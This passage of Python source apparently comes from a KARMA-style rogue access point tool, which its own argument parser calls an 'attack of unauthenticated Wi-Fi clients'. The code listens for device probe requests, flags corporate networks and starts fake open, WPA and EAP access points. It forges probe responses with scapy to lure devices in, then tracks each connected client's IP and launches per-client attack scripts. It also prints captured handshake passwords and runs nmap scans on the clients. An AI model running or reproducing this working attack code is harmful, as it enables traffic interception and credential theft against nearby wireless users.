		return False

known_essids = set([])
pcap_no = 1
def parse_raw_80211(p):
	global known_essids, hostapd_opn, hostapd_wpa, hostapd_wpe, pcap_no, is_exit
	if is_exit:
		raise Exception
	if Dot11ProbeReq in p:
		if p[Dot11].subtype == 4:
			sta = p[Dot11].addr2
			try:
				essid = str(p[Dot11Elt].info, "utf-8")
			except:
				essid = ""
			vendor = lookup(sta)
			signal = "%s" % p[RadioTap].dBm_AntSignal if hasattr(p[RadioTap], "dBm_AntSignal") else "-"
			freq = "%d" % p[RadioTap].ChannelFrequency if hasattr(p[RadioTap], "ChannelFrequency") else "-"

			on_probe(essid, sta, freq, signal, vendor)
			if essid:
				is_new = statistics(sta, essid)
				if is_new:
					dev_cat  = _classify_vendor(vendor)
					sec_hint = _probe_security(p)
					is_corp  = _is_corporate_ssid(essid) or sec_hint == 'WPA2-EAP?'
					cat_part = f"  {Fore.LIGHTGREEN_EX}{dev_cat}{Fore.BLUE}" if dev_cat else f"  {vendor[:18]}"
					corp_badge = f"  {Fore.LIGHTRED_EX}★ CORPORATE{Fore.BLUE}" if is_corp else ""
					print(
						f"{Fore.BLUE}[+] [{get_time()}] "
						f"◈  {Fore.LIGHTYELLOW_EX}\"{essid}\"{Fore.BLUE}"
						f"  {sta}  {signal} dBm"
						f"{cat_part}"
						f"  {Fore.YELLOW}[{sec_hint}]{Fore.RESET}"
						f"{corp_badge}{Fore.RESET}"
					)
				else:
					# Repeat probe — debug only (suppress terminal spam)
					DEBUG(f"  probe  {essid:<28} {sta}  {signal} dBm  [{len(probes[essid])}x]")
				passwords_new = update_handshakes_info()
				if passwords_new:
					for essid in passwords_new:
						WARN("{essid} {password}".format(essid=essid, password=passwords_new[essid]))
				if essid and not essid in known_essids and not hostapd_opn and not hostapd_wpa and not hostapd_wpe:
					pcap_no += 1
					#os.system("killall -KILL hostapd 2> /dev/null")
					if args.opn:
						Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
						known_essids.add(essid)
						probe_response(args.mon, sta, essid)
					#sleep(1)
					if args.wpa:
						Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
						known_essids.add(essid)
						probe_response(args.mon, sta, essid, is_wpa=True)
					#sleep(1)
					if args.eap:
						Thread(target=start_AP_EAP, args=(args.eap,essid)).start()
						known_essids.add(essid)
						probe_response(args.mon, sta, essid, is_wpa=True)
	'''else:
		essid = "test"
		if not essid in known_essids and not hostapd_opn and not hostapd_wpa:
			pcap_no += 1
			if args.opn:
				Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
			if args.wpa:
				Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
			known_essids.add(essid)'''
				
known_targets          = set()
_arping_done           = set()    # MACs we've already active-scanned — avoid repeating
_mac_first_seen        = {}       # mac → time.time() — track how long we've waited
_arp_incomplete_probed = set()    # IPs already probed via nmap due to INCOMPLETE ARP entry
_alt_subnets_added     = False    # whether we've added out-of-subnet aliases this session
client_pids       = {}       # mac → [Popen, ...] — on_client procs spawned per client
client_mac_to_ip  = {}       # mac → ip — needed to clear OPN IP-based known_targets

_DBG_LOG = os.path.join(os.environ.get('KARMA_OUT', '/tmp'), 'karma_debug.log')
def _dbg(msg: str):
	try:
		with open(_DBG_LOG, 'a') as _f:
			from datetime import datetime as _dt
			_f.write(f"[{_dt.now().strftime('%H:%M:%S')}] {msg}\n")
	except Exception:
		pass

def _arp_lookup(mac: str, iface: str, verbose: bool = True) -> str:
	"""Return the IP for a MAC. Priority: dhcp-hook file → lease file → ARP → ip neigh."""
	mac_l = mac.lower()
	karma_out = os.environ.get('KARMA_OUT', '/tmp')

	# 0. dhcp-hook output — written by dnsmasq dhcp-script callback (most reliable)
	dhcp_txt = os.path.join(karma_out, 'karma_dhcp.txt')
	try:
		with open(dhcp_txt) as f:
			for line in f:
				parts = line.strip().split()
				if len(parts) >= 2 and parts[1].lower() == mac_l:
					ip = parts[0]
					if ip and ip != "0.0.0.0":
						if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (dhcp-hook)")
						return ip
	except FileNotFoundError:
		if verbose: _dbg(f"[HOOK] {dhcp_txt} not found yet")
	except Exception as e:
		if verbose: _dbg(f"[HOOK] error: {e}")

	# 1. dnsmasq lease file  (format: <expiry> <mac> <ip> <hostname> <clientid>)
	lease_path = "/tmp/dhcp_{iface}.leases".format(iface=iface)
	try:
		with open(lease_path) as f:
			content = f.read().strip()
			if verbose: _dbg(f"[LEASE] {lease_path}: {repr(content) if content else 'EMPTY'}")
			for line in content.splitlines():
				parts = line.split()
				if len(parts) >= 3 and parts[1].lower() == mac_l:
					ip = parts[2]
					if ip and ip != "0.0.0.0":
						if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (lease file)")
						return ip
	except FileNotFoundError:
		if verbose: _dbg(f"[LEASE] {lease_path} — NOT FOUND")
	except Exception as e:
		if verbose: _dbg(f"[LEASE] error: {e}")

	# 2. kernel ARP table
	try:
		with open("/proc/net/arp") as f:
			arp_lines = [l.strip() for l in f.readlines() if iface in l]
			if verbose: _dbg(f"[ARP] wlan1 entries: {arp_lines}")
			for line in arp_lines:
				parts = line.split()
				if len(parts) >= 6 and parts[3].lower() == mac_l:
					ip = parts[0]
					if ip != "0.0.0.0":
						if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (ARP table)")
						return ip
	except Exception as e:
		if verbose: _dbg(f"[ARP] error: {e}")
		pass

	# 3. ip neigh (catches entries on any interface — useful when AP uses bridge)
	try:
		out = subprocess.check_output(["ip", "neigh", "show", "dev", iface],
		                              stderr=subprocess.DEVNULL).decode().strip()
		if verbose: _dbg(f"[NEIGH] ip neigh dev {iface}: {repr(out) if out else 'EMPTY'}")
		for line in out.splitlines():
			parts = line.split()
			if len(parts) >= 5 and parts[4].lower() == mac_l:
				ip = parts[0]
				if ip and ip != "0.0.0.0":
					if verbose: _dbg(f"[IP-FOUND] {mac} → {ip} (ip neigh)")
					return ip
	except Exception as e:
		if verbose: _dbg(f"[NEIGH] error: {e}")

	if verbose: _dbg(f"[IP-MISS] {mac} — all sources exhausted, no IP found")
	return ""

	return ""

def _arp_complete_entries(iface: str) -> dict:
	"""Return {ip: mac_lower} for all COMPLETE ARP entries on iface."""
	result = {}
	try:
		with open("/proc/net/arp") as f:
			for line in f:
				if iface not in line:
					continue
				parts = line.split()
				if len(parts) < 6:
					continue
				ip, _, flags, mac, _, _ = parts[:6]
				if mac != "00:00:00:00:00:00" and flags != "0x0":
					result[ip] = mac.lower()
	except Exception:
		pass
	return result

def _pin_arp(ip: str, mac: str, iface: str):
	"""Add permanent static ARP entry so kernel never loses the route to the client."""
	ret = os.system(f"ip neigh replace {ip} lladdr {mac} dev {iface} nud permanent 2>/dev/null")
	if ret == 0:
		_dbg(f"[ARP-PIN] {ip} → {mac} pinned permanent on {iface}")
	else:
		_dbg(f"[ARP-PIN] {ip} → {mac} pin failed (ret={ret})")

def _probe_incomplete_arps(iface: str):
	"""nmap any new INCOMPLETE ARP entry to force MAC resolution quickly."""
	global _arp_incomplete_probed
	try:
		with open("/proc/net/arp") as f:
			for line in f:
				if iface not in line:
					continue
				parts = line.split()
				if len(parts) < 6:
					continue
				ip, _, _, mac, _, _ = parts[:6]
				if mac == "00:00:00:00:00:00" and ip not in _arp_incomplete_probed:
					_arp_incomplete_probed.add(ip)
					_dbg(f"[ARP-INCOMPLETE] {ip} detected, probing to resolve MAC")
					subprocess.Popen(f"nmap -sn -n {ip} >/dev/null 2>&1", shell=True)
	except Exception:
		pass

def _drop_client(mac):
	"""Kill on_client scripts for a client that lost connection and free its known_targets
	slot so a future reconnect can trigger on_client again."""
	global known_targets
	procs = client_pids.pop(mac, [])
	for p in procs:
		try:
			os.killpg(os.getpgid(p.pid), SIGTERM)
			DEBUG(f"[drop] killed on_client proc for {mac}")
		except (ProcessLookupError, OSError):
			pass
		try:
			client_scenarios.remove(p)
		except ValueError:
			pass
	known_targets.discard(mac)                       # WPA (MAC-based)
	ip = client_mac_to_ip.pop(mac, None)
	if ip:
		known_targets.discard(ip)                    # OPN (IP-based)

def parse_client_trafic_OPN(p):
	global known_targets, hostapd_opn
	if IP in p:
		src = p[IP].src
		dst = p[IP].dst
	elif ARP in p:
		src = p[ARP].psrc
		dst = p[ARP].pdst
	else:
		return

	if src in ("0.0.0.0", "127.0.0.1", hostapd_opn.dhcpd.ip_gw if hostapd_opn.dhcpd else ""):
		return
	if src in known_targets or dst in known_targets:
		return
	if p[Ether].src == opn_mac:
		return
	client_mac = p[Ether].src
	client_ip = src
	ip_gw = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
	WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
	known_targets.add(client_ip)
	if not client_ip in hostapd_opn.network:
		hostapd_opn.change_network_settings("{ip}/24".format(ip=ip_gw))
	on_client(client_ip, client_mac, ip_gw)

def parse_client_trafic_WPA(p):
	global known_targets, hostapd_wpa
	if IP in p:
		src = p[IP].src
		dst = p[IP].dst
	elif ARP in p:
		src = p[ARP].psrc
		dst = p[ARP].pdst
	else:
		return

	client_mac = p[Ether].src
	client_ip = src
	if src in ("0.0.0.0", "127.0.0.1", hostapd_wpa.dhcpd.ip_gw if hostapd_wpa.dhcpd else ""):
		return
	if client_mac in known_targets:
		return
	if p[Ether].src == wpa_mac:
		return
	ip_gw = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
	WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
	known_targets.add(client_mac)
	if not client_ip in hostapd_wpa.network:
		hostapd_wpa.change_network_settings("{ip}/24".format(ip=ip_gw))
	on_client(client_ip, client_mac, ip_gw)

def get_beacon(essid):
	radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(1),Antenna=1)
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=wpa_mac, addr3=wpa_mac)
	beacon = Dot11Beacon(cap='ESS+privacy')
	essid = Dot11Elt(ID='SSID',info=essid, len=len(essid))
	return radio/dot11/beacon/essid

def probe_response(iface, target, essid, is_wpa=False):
	RATE_1B = b"\x82"
	RATE_2B = b"\x84"
	RATE_5_5B = b"\x8b"
	RATE_11B = b"\x96"
	if is_wpa:
		cap = 0x3104
		mac = wpa_mac
	else:
		cap = 0x2104
		mac = opn_mac
	#radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(77),Antenna=1)
	radio = RadioTap()
	probe = Dot11(subtype=5, addr1=target, addr2=mac, addr3=mac, SC=0x3060)/\
	 Dot11ProbeResp(timestamp=123123123, beacon_interval=0x0064, cap=cap)/\
	 Dot11Elt(ID='SSID', info=essid)/\
	 Dot11Elt(ID='Rates', info=RATE_1B+RATE_2B+RATE_5_5B+RATE_11B)/\
	 Dot11Elt(ID='DSset', info=chr(1))
	sendp(radio/probe, iface=iface, loop=0)

def sniffer(iface):
	try:
		sniff(iface=iface, prn=parse_raw_80211, store=0,
		      stop_filter=lambda p: is_exit)
	except Exception:
		return


parser = argparse.ArgumentParser(description='KARMA - attack of unauthenticated Wi-Fi clients')
parser.add_argument("-mon", type=str, metavar='iface', default='', help="interface for monitoring 802.11 Probes")
parser.add_argument("-opn", type=str, metavar='iface', default='', help="interface for starting OPN networks")
parser.add_argument("-wpa", type=str, metavar='iface', default='', help="interface for starting WPA networks")
parser.add_argument("-eap", type=str, metavar='iface', default='', help="interface for starting EAP networks")
parser.add_argument("-T", type=int, metavar='seconds', default='20', help="wifi network working time")
parser.add_argument("--essid", type=str, metavar='name', default='', help="force start wifi network with ESSID")
parser.add_argument("--psk", type=str, metavar='password', default='', help="use PSK key for WPA networks")
parser.add_argument("--ac-essid", action="store_true", default=False, help=f"AC monitoring shortcut: force --essid {AC_ESSID} --psk {AC_PSK} and run only fetch_ac + nmap hooks")
parser.add_argument("-d", action="store_true", default=False, help="show more info")
args = parser.parse_args()

if args.ac_essid:
	args.essid = AC_ESSID
	args.psk   = AC_PSK
	CLIENT_MONITOR_TIMEOUT = 1

origin = conf.iface
if args.opn:
	conf.iface = args.opn
opn_mac = Ether().src
if args.wpa:
	conf.iface = args.wpa
wpa_mac = Ether().src
conf.iface = origin
TIMEOUT = args.T

update_handshakes_info()

# Register SIGINT handler here so ALL execution paths (--opn, --wpa, --eap,
# --ac-essid, --mon) get clean shutdown. Without this, running with
# --ac-essid + -wpa/-opn had no handler and Ctrl+C left hostapd/dnsmasq
# and all on_client scripts running as orphans.
def _sigint_handler(sig, frame):
	global is_exit
	if is_exit:
		return   # already shutting down, ignore repeated Ctrl+C
	print("\n[!] Ctrl+C — stopping...")
	is_exit = True
	stop_APs()
signal_register(SIGINT, _sigint_handler)

if args.opn and args.essid:
	start_AP_OPN(args.opn, args.essid)
elif args.wpa and args.essid:
	start_AP_WPA(args.wpa, args.essid)
elif args.eap and args.essid:
	start_AP_EAP(args.eap, args.essid)
elif args.mon:

	t_control = Thread(target=control, daemon=True)
	t_sniffer = Thread(target=sniffer, args=(args.mon,), daemon=True)
	t_control.start()
	t_sniffer.start()
	try:
		# Use timeout-based join so Ctrl+C can interrupt the main thread.
		# t_control is daemon so it dies automatically on exit.
		# t_sniffer exits once is_exit=True and the next packet arrives.
		while not is_exit:
			t_sniffer.join(timeout=0.5)
			if not t_sniffer.is_alive():
				break
	except KeyboardInterrupt:
		if not is_exit:
			is_exit = True
			stop_APs()
	print("exiting...")
